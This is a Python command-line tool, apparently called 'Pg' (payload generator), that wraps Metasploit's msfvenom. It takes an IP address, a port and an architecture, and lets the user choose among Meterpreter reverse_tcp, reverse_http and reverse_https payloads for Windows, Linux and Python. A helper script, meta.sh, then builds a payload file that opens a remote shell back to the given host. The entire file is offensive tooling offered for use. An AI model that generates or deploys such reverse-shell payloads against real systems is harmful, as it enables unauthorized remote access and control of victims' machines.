#!/usr/bin/python3

import subprocess
import re
import os
from time import sleep
import sys

# TODO:
# 	Add new commands
#	Improve the code
# 	code into classes
# 	add more payloads
#	Bugs and Glitches


BLACK = "\033[1;30m"
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
BOLD = "\033[1m"
regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
ninput = f"{BOLD}{YELLOW}pg~#{WHITE} "
comm = (
    'lists',
    'preinfo',
    'payload',
    'display',
    'run',
)
IP = "0.0.0.0"
PORT = 1234
ARCH = "x86"
PAYLOAD = ""


def info():
    print(f"""\n{RED}
        ██████╗░░█████╗░██╗░░░██╗██╗░░░░░░█████╗░░█████╗░██████╗░
        ██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗██╔══██╗
        ██████╔╝███████║░╚████╔╝░██║░░░░░██║░░██║███████║██║░░██║
        ██╔═══╝░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██║██║░░██║
        ██║░░░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║██████╔╝
        ╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░

        ░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
        ██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
        ██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
        ██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
        ╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
        ░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
    \n
    {CYAN}
    Pg v1.0 Alpha
    Written by str1ke007

    {BOLD}{YELLOW}'lists' to display the command

    {CYAN}github: https://github.com/str1ke007 {WHITE}
    """)


def menu():
	print(f"\n\n\t\t {MAGENTA}PAYLOAD MENU\n\n")
	print(f"{GREEN}1) Windows")
	print(f"{GREEN}2) Linux(x86/x64)")
	print(f"{GREEN}3) Python Script")


def lists():
    print(f"\n{RED}preinfo{WHITE}\t\tenter basic details")
    print(f"{RED}payload{WHITE}\t\tdisplays info about the available payloads")
    print(f"{RED}run{WHITE}\t\trun the generator")
    print(f"{RED}display{WHITE}\t\tdisplay all")
    print(f"{RED}clear{WHITE}\t\tclear screen")
    print(f"{RED}exit{WHITE}\t\texit\n")


def display(IP, PORT, ARCH):
    if IP and PORT and ARCH:
        print(f"\n{MAGENTA}IP\t: {IP}")
        print(f"PORT\t: {PORT}")
        if ARCH == 1:
            print(f"ARCH\t: x64\n")
        else:
            print(f"ARCH\t: x86\n")


def display_payload(PAYLOAD):
    try:
        print(f"PAYLOAD\t: {PAYLOAD}\n{WHITE}")
    except:
        print(f"\n\n{RED}[-] No payload to display{WHITE}\n\n")


def payload():
    # Windows
    windows = {
        1: "windows/meterpreter/reverse_http",
        2: "windows/meterpreter/reverse_https",
        3: "windows/meterpreter/reverse_tcp",
    }

    # Linux
    linux = {
        1: "linux/x86/meterpreter/reverse_http",
        2: "linux/x86/meterpreter/reverse_https",
        3: "linux/x86/meterpreter/reverse_tcp",
        4: "linux/x64/meterpreter/reverse_http",
        5: "linux/x64/meterpreter/reverse_https",
        6: "linux/x64/meterpreter/reverse_tcp",
    }

    # Python
    python = {
        1: "python/meterpreter/reverse_http",
        2: "python/meterpreter/reverse_https",
        3: "python/meterpreter/reverse_tcp",
    }
    try:
        menu()
        OP = int(input(f"{ninput}"))
    except ValueError:
            print(f"{RED}\n[-] Invalid Input!\n{WHITE}")
    print("\n")
    if OP == 1:
        for key, value in windows.items():
            print(f"{RED}{key}{WHITE}", value, sep=" : ")
        PAYLOAD = entry()
        for key, value in windows.items():
            if key == PAYLOAD:
                str(PAYLOAD)
                PAYLOAD = value
    elif OP == 2:
        for key, value in linux.items():
            print(f"{RED}{key}{WHITE}", value, sep=": ")
        PAYLOAD = entry()
        for key, value in linux.items():
            if key == PAYLOAD:
                str(PAYLOAD)
                PAYLOAD = value
    else:
        for key, value in python.items():
            print(f"{RED}{key}{WHITE}", value, sep=": ")
        PAYLOAD = entry()
        for key, value in python.items():
            if key == PAYLOAD:
                str(PAYLOAD)
                PAYLOAD = value
    print("\n")
    return OP, PAYLOAD


def entry():
    try:
        PAYLOAD = int(input(f"{ninput}"))
    except ValueError:
        print(f"{RED}\n[-] Invalid Input!\n{WHITE}")
    return PAYLOAD


def check(IP):
    if(re.search(regex, IP)):
        return 1
    else:
        return 0


def pre_requisite():
	from shutil import which
	return which("msfvenom") is not None


def preinfo():
    while True:
        print(f"\n\t{BLUE}Available Options\n{RED}  IP\n  PORT\n  ARCHITECTURE\n\n{CYAN}IP?\n")
        IP = input(f"{ninput}")
        try:
            print(f"\n{CYAN}PORT?\n")
            PORT = int(input(f"{ninput}"))
        except:
            PORT = 1234
            print(f"{RED}\n[-] Invalid PORT\n{GREEN}[+] Selecting Default PORT=1234\n")
            sleep(2)
        if check(IP) and PORT in range(2, 65536):
            break
        else:
            print(f"\n\n{RED}[-] Invalid IP\n\n[-] Please wait...")
            sleep(2)

    print(f"\n{RED}Architecture (Default -> x86){GREEN}\n1) x64\n2) x86\n")
    # Architecture Default (x86)
    ARCH = input(f"{ninput}")
    if not ARCH:
        ARCH=2

    return IP, PORT, ARCH


def run(IP, PORT, ARCH, OP, PAYLOAD):
    try:				
        print(f"\n{CYAN}[+] Please wait for few minutes...\n{CYAN}")
        result = subprocess.call([f"./meta.sh", f"{IP}", f"{PORT}", f"{OP}", f"{ARCH}", f"{PAYLOAD}"])
        if not result:
            print(f"\n{GREEN}[+] Successful\n[+] File saved in {os.getcwd()}\n")
        else:
            print(f"{RED}[-] Error!")
    except:
        print(f"{RED}Invalid Input!")


def main():
    if pre_requisite() == False:
            print(f"{RED}\n\n[-] Metasploit is not installed.")
            sleep(4)
            sys.exit()
    info()
    while True:
        try:
            command = input(f"{ninput}")
            if 'lists' in command.casefold():
                lists()
            elif 'preinfo' in command.casefold():
                IP, PORT, ARCH = preinfo()
            elif 'payload' in command.casefold():
                OP, PAYLOAD = payload()
            elif 'display' in command.casefold():
                try:
                    display(IP, PORT, ARCH)
                    try:
                        display_payload(PAYLOAD)
                    except:
                        pass
                except:
                    print(f"\n{MAGENTA}IP\t: 0.0.0.0 {RED}(not Default){MAGENTA}")
                    print(f"PORT\t: 1234")
                    print(f"ARCH\t: x86")
                    print(f"PAYLOAD\t: None\n{WHITE}")
            elif 'run' in command.casefold():
                try:
                    run(IP, PORT, ARCH, OP, PAYLOAD)
                except:
                    print(f"\n\n{RED}[-] IP/PORT/PAYLOAD ?\n\n{WHITE}")
            elif command.casefold() in ('clear', 'cls'):
                os.system('clear')
            elif 'exit' in command.casefold():
                print(f"\n{BLUE}[-] Thank you for trying out!\n\n")
                sys.exit()
            else:
                pass
        except KeyboardInterrupt:
            print(f"\n\n{BLUE}[-] Type {RED}'exit'{BLUE} to quit\n")


if __name__ == "__main__":
    main()
